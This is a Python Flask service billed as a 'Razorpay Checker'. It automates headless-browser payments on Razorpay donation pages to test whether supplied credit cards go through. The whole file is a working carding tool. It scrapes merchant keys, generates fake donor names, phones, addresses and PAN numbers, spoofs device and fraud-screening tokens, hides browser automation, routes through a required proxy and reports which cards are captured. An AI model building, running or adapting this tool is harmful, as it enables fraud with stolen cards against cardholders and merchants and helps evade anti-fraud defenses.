#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Razorpay Checker — Fast · Accurate · Reliable · Zero asyncio clashes.
Playwright sync runs on dedicated worker threads with per-thread browser cache.
"""

import os
import re
import json
import time
import random
import string
import hashlib
import secrets
import logging
import threading
import concurrent.futures
from base64 import b64encode
from urllib.parse import quote

from flask import Flask, request, jsonify
from playwright.sync_api import sync_playwright, TimeoutError as PWTimeoutError

# ------------------------------------------------------------------ config
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("rzp")

app = Flask(__name__)
app.config["JSON_SORT_KEYS"] = False

DEV_BASE = "QFhvYXJjaA=="
BASE62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

FIRST = ["Aarav","Vivaan","Aditya","Vihaan","Arjun","Sai","Ishaan","Rohan","Karan",
         "Rahul","Ravi","Amit","Vikram","Anil","Sunil","Rajesh","Sanjay","Deepak",
         "Manoj","Suresh"]
LAST  = ["Sharma","Patel","Singh","Verma","Gupta","Reddy","Kumar","Joshi","Mehta",
         "Nair","Shah","Das","Bose","Chopra","Malhotra","Saxena","Rao","Desai",
         "Pillai","Menon"]
STREETS = ["MG Road","Park Street","Church Street","Linking Road","Banjara Hills",
           "Civil Lines","Marine Drive","Connaught Place","Sector 62",
           "Bannerghatta Road","Lavelle Road","Sadar Bazaar"]
CITIES = ["Mumbai","Delhi","Bangalore","Hyderabad","Chennai","Kolkata","Pune",
          "Ahmedabad","Jaipur","Lucknow","Surat","Indore"]
PINS = ["400001","110001","560001","500001","600001","700001","380001","302001",
        "226001","452001","160001","800001"]

BUILD_DEFAULT    = "afa3662e035e66c495f2ddc21c6f030530870f53"
BUILD_V1_DEFAULT = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

LAUNCH_ARGS = [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-blink-features=AutomationControlled",
    "--disable-features=IsolateOrigins,site-per-process",
]

# Dedicated pool — threads here are guaranteed to have no asyncio loop.
_pool = concurrent.futures.ThreadPoolExecutor(max_workers=4, thread_name_prefix="rzp")

# ------------------------------------------------------------------ helpers
def rand_phone():
    return "+91" + str(random.choice([6,7,8,9])) + "".join(str(random.randint(0,9)) for _ in range(9))

def rand_name():
    return f"{random.choice(FIRST)} {random.choice(LAST)}"

def rand_email(n):
    return n.lower().replace(" ", ".") + str(random.randint(1, 99)) + "@gmail.com"

def rand_address():
    i = random.randint(0, len(CITIES) - 1)
    return f"{random.randint(1,999)} {random.choice(STREETS)}, {CITIES[i]}- {PINS[i]}"

def rand_pan():
    return ("".join(random.choices(string.ascii_uppercase, k=5))
            + "".join(random.choices(string.digits, k=4))
            + random.choice(string.ascii_uppercase))

def parse_proxy(p):
    if not p:
        return None
    p = p.strip()
    scheme = "http"
    if "://" in p:
        s = p.split("://", 1)
        if s[0].lower() in ("http", "https", "socks4", "socks5"):
            scheme = s[0].lower()
            p = s[1]

    user = pwd = ""
    if "@" in p:
        auth, host = p.rsplit("@", 1)
        user, _, pwd = auth.partition(":")
    elif p.count(":") == 3:
        ip, port, user, pwd = p.split(":")
        host = f"{ip}:{port}"
    elif p.count(":") == 1:
        host = p
    else:
        return None

    cfg = {"server": f"{scheme}://{host}"}
    if user:
        cfg["username"] = user
        cfg["password"] = pwd
    return cfg

def parse_cc(cc):
    parts = cc.split("|")
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        "number": parts[0].strip().replace(" ", ""),
        "month": parts[1].strip().zfill(2),
        "year": parts[2].strip()[-2:],
        "cvv": parts[3].strip(),
    }

def build_device_id():
    h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = str(random.randrange(10**8)).zfill(8)
    return f"1.{h}.{ts}.{rnd}"

def build_token_create(checkout_id):
    payload = [
        {"name": "sardine", "metadata": {"session_id": checkout_id}},
        {"name": "stripe_radar",
         "metadata": {"session_id": "rse_" + "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(22))}},
    ]
    return b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode()

# ------------------------------------------------------------------ per-worker-thread browser cache
_tls = threading.local()

def get_browser(proxy_cfg):
    key = json.dumps(proxy_cfg, sort_keys=True) if proxy_cfg else "direct"
    st = getattr(_tls, "state", None)

    if st and st["key"] == key and st["browser"].is_connected():
        return st["browser"]

    # teardown
    if st:
        try:
            st["browser"].close()
        except Exception:
            pass
        try:
            st["pw"].stop()
        except Exception:
            pass

    pw = sync_playwright().start()
    browser = pw.chromium.launch(headless=True, proxy=proxy_cfg, args=LAUNCH_ARGS)
    _tls.state = {"pw": pw, "browser": browser, "key": key}
    return browser

def drop_browser():
    st = getattr(_tls, "state", None)
    if st:
        try:
            st["browser"].close()
        except Exception:
            pass
        try:
            st["pw"].stop()
        except Exception:
            pass
        _tls.state = None

# ------------------------------------------------------------------ core
def run_check(site_url, cc, proxy_cfg):
    t0 = time.time()
    card = parse_cc(cc)

    name = rand_name()
    phone = rand_phone()
    email = rand_email(name)
    address = rand_address()
    pan = rand_pan()
    device_id = build_device_id()
    unified_id = "".join(secrets.choice(BASE62) for _ in range(14))

    try:
        browser = get_browser(proxy_cfg)
    except Exception as e:
        return {"ok": False, "response": f"browser launch failed: {str(e)[:150]}",
                "time": round(time.time() - t0, 2)}

    ctx = browser.new_context(
        user_agent=UA,
        viewport={"width": 1366, "height": 768},
        locale="en-IN",
        timezone_id="Asia/Kolkata",
    )
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
    page = ctx.new_page()
    page.set_default_timeout(40000)

    try:
        # --- 1. merchant data
        page.goto(site_url, wait_until="domcontentloaded", timeout=35000)
        merchant = page.evaluate("""() => {
            const out = {};
            const scan = (obj) => {
                if (!obj || typeof obj !== 'object') return;
                if (obj.keyless_header) out.keyless_header = obj.keyless_header;
                if (obj.key_id) out.key_id = obj.key_id;
                if (obj.payment_link) {
                    out.payment_link_id = obj.payment_link.id;
                    const items = obj.payment_link.payment_page_items || [];
                    if (items[0]) out.payment_page_item_id = items[0].id;
                    const amt = items[0]?.item?.amount || obj.payment_link.min_amount_value;
                    if (amt) out.amount = parseInt(amt, 10);
                }
            };
            scan(window.data);
            scan(window.__INITIAL_STATE__);
            scan(window.__CHECKOUT_DATA__);
            if (!out.keyless_header) {
                for (const s of document.querySelectorAll('script')) {
                    const t = s.textContent || '';
                    let m = t.match(/keyless_header["']?\\s*[:=]\\s*["']([^"']+)/);
                    if (m) out.keyless_header = m[1];
                    m = t.match(/key_id["']?\\s*[:=]\\s*["']([^"']+)/);
                    if (m) out.key_id = m[1];
                    m = t.match(/payment_link_id["']?\\s*[:=]\\s*["']([^"']+)/);
                    if (m) out.payment_link_id = m[1];
                    m = t.match(/payment_page_item_id["']?\\s*[:=]\\s*["']([^"']+)/);
                    if (m) out.payment_page_item_id = m[1];
                }
            }
            return out;
        }""")

        needed = ("keyless_header", "key_id", "payment_link_id", "payment_page_item_id")
        missing = [k for k in needed if not merchant.get(k)]
        if missing:
            return {"ok": False, "response": f"merchant data missing: {', '.join(missing)}",
                    "time": round(time.time() - t0, 2)}

        keyless_header = merchant["keyless_header"]
        key_id = merchant["key_id"]
        payment_link_id = merchant["payment_link_id"]
        payment_page_item_id = merchant["payment_page_item_id"]
        amount = int(merchant.get("amount") or 100)
        if amount < 100:
            amount = 100

        # --- 2. session token
        params = {
            "traffic_env": "production",
            "build": BUILD_DEFAULT,
            "build_v1": BUILD_V1_DEFAULT,
            "checkout_v2": "1",
            "new_session": "1",
            "keyless_header": keyless_header,
            "rzp_device_id": device_id,
            "unified_session_id": unified_id,
        }
        qs = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in params.items())
        page.goto(f"https://api.razorpay.com/v1/checkout/public?{qs}",
                  wait_until="domcontentloaded", timeout=35000)

        session_token = page.evaluate("""() => {
            if (window.session_token) return window.session_token;
            const html = document.documentElement.innerHTML;
            const m = html.match(/session_token["']?\\s*[:=]\\s*["']([A-F0-9]{40,})["']/);
            return m ? m[1] : null;
        }""")
        if not session_token:
            return {"ok": False, "response": "session_token not found",
                    "time": round(time.time() - t0, 2)}

        # --- 3. create order
        order_id = page.evaluate("""async ([pl, ppi, amt]) => {
            try {
                const r = await fetch(`https://api.razorpay.com/v1/payment_pages/${pl}/order`, {
                    method: 'POST',
                    headers: {'Accept':'application/json','Content-Type':'application/json'},
                    body: JSON.stringify({
                        notes: {comment: '', name: 'Donor'},
                        line_items: [{payment_page_item_id: ppi, amount: amt}]
                    })
                });
                const d = await r.json();
                if (d.order) return d.order.id;
                if (d.error) return 'ERR:' + JSON.stringify(d.error);
                return null;
            } catch (e) { return 'ERR:' + e.message; }
        }""", [payment_link_id, payment_page_item_id, amount])

        if not order_id or str(order_id).startswith("ERR:"):
            return {"ok": False, "response": f"order failed: {order_id}",
                    "time": round(time.time() - t0, 2)}

        checkout_id = order_id.split("_", 1)[1] if "_" in order_id else order_id
        token_create = build_token_create(checkout_id)

        # --- 4. submit payment
        payload = {
            "notes[comment]": "",
            "notes[email]": email,
            "notes[phone]": phone[3:],
            "notes[full_name_of_the_donor]": name,
            "notes[full_address_of_the_donor]": address,
            "notes[pan_number]": pan,
            "payment_link_id": payment_link_id,
            "key_id": key_id,
            "contact": phone,
            "email": email,
            "currency": "INR",
            "user_risk_providers_token": token_create,
            "_[integration]": "payment_pages",
            "_[checkout_id]": checkout_id,
            "_[device.id]": device_id,
            "_[library]": "checkoutjs",
            "_[platform]": "browser",
            "_[os]": "windows",
            "_[referer]": site_url,
            "_[shield][fhash]": hashlib.sha1(secrets.token_bytes(16)).hexdigest(),
            "_[shield][tz]": "330",
            "_[device_id]": device_id,
            "_[build]": BUILD_DEFAULT,
            "_[request_index]": "1",
            "amount": str(amount),
            "order_id": order_id,
            "method": "card",
            "card[number]": card["number"],
            "card[cvv]": card["cvv"],
            "card[name]": name,
            "card[expiry_month]": card["month"],
            "card[expiry_year]": card["year"],
            "save": "0",
        }

        result = page.evaluate("""async ([payload, k, st, kh]) => {
            const qs = new URLSearchParams({key_id: k, session_token: st, keyless_header: kh});
            const body = new URLSearchParams();
            for (const [key, val] of Object.entries(payload)) body.append(key, val);
            try {
                const url = `https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?${qs.toString()}`;
                const r = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'x-session-token': st,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://api.razorpay.com',
                        'Referer': `https://api.razorpay.com/v1/checkout/public?session_token=${st}`
                    },
                    body: body.toString()
                });
                const text = await r.text();
                let parsed; try { parsed = JSON.parse(text); } catch { parsed = text; }
                return {status: r.status, body: parsed};
            } catch (e) { return {status: 0, body: 'NETWORK:' + e.message}; }
        }""", [payload, key_id, session_token, keyless_header])

        body = result.get("body") if isinstance(result, dict) else result
        payment_id = None

        if isinstance(body, dict):
            payment_id = (body.get("payment_id")
                          or body.get("razorpay_payment_id")
                          or (body.get("payment") or {}).get("id"))

            if body.get("redirect") is True or body.get("type") == "redirect":
                redirect_url = ""
                if isinstance(body.get("request"), dict):
                    redirect_url = body["request"].get("url", "")
                if redirect_url:
                    try:
                        page.goto(redirect_url, wait_until="domcontentloaded", timeout=40000)
                        html = page.content()
                        if "razorpay_signature" in html:
                            return {"ok": True,
                                    "response": f"payment_id: {payment_id or 'n/a'} | redirect | captured",
                                    "payment_id": payment_id, "order_id": order_id,
                                    "time": round(time.time() - t0, 2)}
                        status = page.evaluate("""async ([pid, k, st, kh]) => {
                            const qs = new URLSearchParams({key_id: k, session_token: st, keyless_header: kh});
                            try {
                                const r = await fetch(`https://api.razorpay.com/v1/standard_checkout/payments/${pid}?${qs}`, {
                                    headers: {'x-session-token': st}
                                });
                                const d = await r.json();
                                return d.status || 'unknown';
                            } catch { return 'unknown'; }
                        }""", [payment_id, key_id, session_token, keyless_header])
                        ok = status in ("captured", "authorized")
                        return {"ok": ok,
                                "response": f"payment_id: {payment_id} | 3ds | status: {status}",
                                "payment_id": payment_id, "order_id": order_id,
                                "time": round(time.time() - t0, 2)}
                    except Exception as e:
                        return {"ok": False,
                                "response": f"3ds error: {str(e)[:120]}",
                                "payment_id": payment_id, "order_id": order_id,
                                "time": round(time.time() - t0, 2)}
                return {"ok": False, "response": "3ds redirect without url",
                        "payment_id": payment_id, "order_id": order_id,
                        "time": round(time.time() - t0, 2)}

            if "razorpay_signature" in body or "signature" in body:
                return {"ok": True,
                        "response": f"payment_id: {payment_id or 'n/a'} | captured",
                        "payment_id": payment_id, "order_id": order_id,
                        "time": round(time.time() - t0, 2)}

            if "error" in body:
                err = body["error"]
                desc = err.get("description") or err.get("reason") or str(err)
                return {"ok": False, "response": str(desc)[:200],
                        "payment_id": payment_id, "order_id": order_id,
                        "time": round(time.time() - t0, 2)}

            if body.get("status") in ("captured", "authorized"):
                return {"ok": True,
                        "response": f"payment_id: {payment_id or 'n/a'} | status: {body['status']}",
                        "payment_id": payment_id, "order_id": order_id,
                        "time": round(time.time() - t0, 2)}

            return {"ok": False, "response": json.dumps(body)[:200],
                    "payment_id": payment_id, "order_id": order_id,
                    "time": round(time.time() - t0, 2)}

        return {"ok": False, "response": str(body)[:200],
                "time": round(time.time() - t0, 2)}

    except PWTimeoutError as e:
        return {"ok": False, "response": f"timeout: {str(e)[:150]}",
                "time": round(time.time() - t0, 2)}
    except Exception as e:
        msg = str(e).lower()
        if "target" in msg or "closed" in msg or "crashed" in msg:
            drop_browser()
        return {"ok": False, "response": f"error: {str(e)[:150]}",
                "time": round(time.time() - t0, 2)}
    finally:
        try:
            ctx.close()
        except Exception:
            pass

# ------------------------------------------------------------------ routes
def _dispatch(site, cc, proxy_cfg):
    """Run check on a dedicated pool thread (no asyncio loop)."""
    try:
        fut = _pool.submit(run_check, site, cc, proxy_cfg)
        return fut.result(timeout=170)
    except concurrent.futures.TimeoutError:
        return {"ok": False, "response": "worker timeout", "time": 0}
    except Exception as e:
        return {"ok": False, "response": f"dispatch error: {str(e)[:150]}", "time": 0}

@app.route("/razorpay", methods=["GET"])
def razorpay_route():
    site = (request.args.get("site") or "").strip()
    cc = (request.args.get("cc") or "").strip()
    proxy = (request.args.get("proxy") or "").strip()

    if not site:
        return jsonify({"CC": cc, "Response": "Site is required", "Site": site, "Time": "0s", "Dev": DEV_BASE}), 400
    if not cc:
        return jsonify({"CC": cc, "Response": "CC is required", "Site": site, "Time": "0s", "Dev": DEV_BASE}), 400
    if not proxy:
        return jsonify({"CC": cc, "Response": "Proxy is required", "Site": site, "Time": "0s", "Dev": DEV_BASE}), 400

    proxy_cfg = parse_proxy(proxy)
    if not proxy_cfg:
        return jsonify({"CC": cc, "Response": "Invalid proxy format", "Site": site, "Time": "0s", "Dev": DEV_BASE}), 400

    out = _dispatch(site, cc, proxy_cfg)

    return jsonify({
        "CC": cc,
        "Response": out.get("response", "unknown"),
        "Status": out.get("ok", False),
        "PaymentID": out.get("payment_id"),
        "OrderID": out.get("order_id"),
        "Site": site,
        "Time": f"{out.get('time', 0)}s",
        "Dev": DEV_BASE,
    })

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "ts": int(time.time())})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, threaded=False, debug=False, use_reloader=False)